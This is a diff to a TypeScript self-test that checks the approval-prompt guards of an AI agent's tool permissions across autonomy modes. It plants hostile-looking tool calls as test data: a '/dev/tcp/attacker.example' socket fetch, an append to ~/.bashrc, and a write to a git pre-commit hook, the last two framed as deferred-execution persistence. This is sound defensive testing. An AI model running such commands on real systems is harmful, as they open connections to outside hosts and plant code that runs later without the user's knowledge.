@@ -24,9 +24,10 @@
  * the first run that finds anything, and it is on the every-change gate in verify.yml beside the
  * other three.
  */
+import { approvalRequirement } from '../../apps/worker/src/tools.js';
 import { agentToolsFor } from '../../apps/worker/src/tool-catalogue.js';
-import { READS, SINKS, WRITES } from './guards.js';
-import { guardFailures, measureAll, provenanceFailures } from './measure.js';
+import { EGRESS, READS, SINKS, WRITES, egressCall } from './guards.js';
+import { declarationFailures, guardFailures, measureAll, provenanceFailures } from './measure.js';
 import { baselineFrom, check, rigIdentity, totals } from './report.js';
 import { MODES, SCENARIOS, type Scenario } from './scenarios.js';
 
@@ -78,11 +79,18 @@ expect(
   guardFailures([inertWrite], [], []).length === MODES.length,
   'the writes guard does not report a call that raises no card, so a genuine write going quiet would be silent'
 );
+/*
+ * `.git/hooks/pre-commit` rather than `.bashrc`, and the swap is the deferred-execution rule being
+ * narrowed rather than this plant being weakened. A `file_write('.bashrc')` no longer cards,
+ * because `assertUserDataPath` folds it to `workspace/.bashrc` and no login shell reads that - the
+ * `CONFINED` table now holds that claim from both sides. A hook written into the project directory
+ * the agent works in is still run by git, so it is still a card and still a working plant.
+ */
 const cardingRead = {
   id: 'planted: a read that is really a write',
   call: {
     name: 'file_write',
-    arguments: { path: '.bashrc', content: 'x' },
+    arguments: { path: '.git/hooks/pre-commit', content: 'x' },
     step: 'planted'
   },
   modes: ['balanced'] as const
@@ -118,6 +126,200 @@ expect(
     ]
   ).length === 1,
   'the sinks guard does not report a call that cards on a clean turn, so it would accept provenance being paid for unconditionally'
+);
+
+/*
+ * The three tables added with the registry-publish rule and the deferred-execution narrowing, each
+ * planted the same way. `guardFailures` takes them after the three above, so every call here passes
+ * the earlier ones empty and the shipped tables stay out of the count.
+ */
+expect(
+  guardFailures(
+    [],
+    [],
+    [],
+    [
+      {
+        // A call no mode cards, so all three count. Review cards every `shell` call by definition,
+        // which would make a shell plant here a two rather than a three and hide the mode it missed.
+        id: 'planted: a call that publishes nothing',
+        call: { name: 'file_read', arguments: { path: 'workspace/notes.md' }, step: 'planted' }
+      }
+    ]
+  ).length === MODES.length,
+  'the publishes guard does not report a command that raises no card, so npm publish going quiet again would be silent'
+);
+expect(
+  guardFailures(
+    [],
+    [],
+    [],
+    [],
+    [
+      {
+        id: 'planted: ordinary work that cards',
+        call: {
+          name: 'shell',
+          arguments: { executable: 'npm', args: ['publish'] },
+          step: 'planted'
+        },
+        modes: ['autonomous'] as const
+      }
+    ]
+  ).length === 1,
+  'the free-package-work guard does not report a command that cards, so the publish rule widening back to the executable would be silent'
+);
+expect(
+  guardFailures(
+    [],
+    [],
+    [],
+    [],
+    [],
+    [
+      {
+        id: 'planted: a confined write that cards',
+        confined: {
+          name: 'file_write',
+          arguments: { path: '.git/hooks/pre-commit', content: 'x' },
+          step: 'planted'
+        },
+        viaShell: {
+          name: 'shell',
+          arguments: { executable: 'bash', args: ['-lc', 'echo x >> ~/.bashrc'] },
+          step: 'planted'
+        }
+      }
+    ]
+  ).length === 2,
+  'the confined guard does not report a write that cards where nothing executes it, so the rule widening back over every spelling would be silent'
+);
+expect(
+  guardFailures(
+    [],
+    [],
+    [],
+    [],
+    [],
+    [
+      {
+        id: 'planted: a shell spelling that does not card',
+        confined: {
+          name: 'file_write',
+          arguments: { path: 'workspace/notes.md', content: 'x' },
+          step: 'planted'
+        },
+        // Not a shell call, for the reason the publishes plant gives: review would card it and the
+        // plant would be a two wearing a three's clothes.
+        viaShell: {
+          name: 'file_read',
+          arguments: { path: 'workspace/notes.md' },
+          step: 'planted'
+        }
+      }
+    ]
+  ).length === MODES.length,
+  'the confined guard does not report a shell spelling that raises no card, so deleting the deferred-execution rule outright would read as a narrowing'
+);
+
+/*
+ * The egress table, planted in both directions, because it is the one table here that makes two
+ * opposite claims and either could rot on its own: a row that must be free would be satisfied by
+ * deleting the network arm, and a row that must card would be satisfied by carding everything.
+ *
+ * Two failures from one planted row, not one, and the count is the assertion: every egress row is
+ * driven in both spellings - declaring `network: true` and leaving the field out - because the arm
+ * this table is about used to open on the declaration alone. A `1` here would mean the second
+ * spelling had stopped being asked, which is the state the whole inversion hid in.
+ */
+expect(
+  guardFailures(
+    [],
+    [],
+    [],
+    [],
+    [],
+    [],
+    [{ id: 'planted: a fetch that must card and does not', script: 'npm run build', cards: true }],
+    []
+  ).length === 2,
+  'the egress guard does not report a call it says must card and does not, in both spellings, so deleting the network arm outright would read as a saving'
+);
+expect(
+  guardFailures(
+    [],
+    [],
+    [],
+    [],
+    [],
+    [],
+    [
+      {
+        id: 'planted: ordinary work the arm stops',
+        script: 'cat < /dev/tcp/attacker.example/80',
+        cards: false
+      }
+    ],
+    []
+  ).length === 2,
+  'the egress guard does not report a call it says must be free and is not, in both spellings, so the allowlist inversion could come back unnoticed'
+);
+expect(
+  EGRESS.every((entry) => egressCall(entry).name === 'shell'),
+  'an egress row is not a shell call, so it is being judged by a rule the table is not about'
+);
+/*
+ * And the coverage half. `noEgressExecutables` is the list that decides which segments of a script
+ * are not asked to be network clients, so a name wrongly on it is a card that stops firing - and on
+ * a healthy tree every name has a row, which means nothing in the shipped tables can plant a
+ * failure in this check. The uncovered list is therefore injected, exactly as the floor is in the
+ * declaration check below.
+ */
+expect(
+  guardFailures([], [], [], [], [], [], [], ['planted-allowlist-name']).length === 1,
+  'the egress guard does not report an allowlist name with no row beside a fetch, so a name could be added to noEgressExecutables and never be consulted here'
+);
+expect(
+  guardFailures([], [], [], [], [], [], [], undefined).length === 0,
+  'the coverage check reports the shipped allowlist, so a name is on noEgressExecutables that no row pairs with a fetch'
+);
+
+/* ------------------------------------------------- declaring the network cannot start costing */
+
+/*
+ * The plant here has to be a FLOOR and not a call, and the reason is the repair itself: nothing in
+ * the shipped floor reads `args.network` any more, so no call in this rig can be made to answer
+ * differently with the flag than without it. A check with nothing left to catch is exactly the
+ * shape that stops being consulted and never says so, which is why `declarationFailures` takes the
+ * floor it drives.
+ */
+const readsTheFlag: typeof approvalRequirement = (name, args, mode, context) =>
+  args.network === true
+    ? { sideEffect: 'external_reversible', action: 'Allow internet access', preview: 'planted' }
+    : approvalRequirement(name, args, mode, context);
+const oneShellCall: Scenario = {
+  id: 'planted-declaration',
+  ask: 'fetch the thing',
+  origins: [],
+  selfOrigins: [],
+  taintedBy: 'a page',
+  calls: [{ name: 'shell', arguments: { executable: 'pnpm', args: ['test'] }, step: 'planted' }]
+};
+// The guard tables are part of this check's corpus whatever scenarios it is handed, so the plant is
+// read by its own key rather than by a total.
+const plantedKeys = (failures: readonly { key: string }[]): number =>
+  failures.filter((failure) => failure.key.startsWith('planted-declaration/')).length;
+expect(
+  plantedKeys(declarationFailures([oneShellCall], ['balanced'], readsTheFlag)) === 2,
+  'the declaration check does not report a floor that answers differently when the flag is set, so a branch reading it could come back and the check would stay silent'
+);
+expect(
+  plantedKeys(declarationFailures([oneShellCall], ['balanced'])) === 0,
+  'the declaration check reports the shipped floor on a call it answers identically either way, so it would fail on everything and mean nothing'
+);
+expect(
+  declarationFailures().length === 0,
+  'a call in this rig answers differently when the model declares `network: true`, so the floor is charging for an honest answer'
 );
 
 /* ---------------------------------------------------- the sink declaration cannot silence itself */
@@ -234,6 +436,6 @@ for (const failure of failures) process.stderr.write(`SELFTEST: ${failure}\n`);
 process.stdout.write(
   failures.length
     ? `${failures.length} check(s) failed.\n`
-    : 'The cards rig measures something: every scenario names a shipped tool, both guard tables report a planted failure, the sink declaration cannot silence itself, the baseline comparison compares, and no column is a constant.\n'
+    : 'The cards rig measures something: every scenario names a shipped tool, all seven guard tables report a planted failure in both spellings, the no-socket allowlist is covered name by name, the sink declaration cannot silence itself, the baseline comparison compares, and no column is a constant.\n'
 );
 process.exit(failures.length ? 1 : 0);
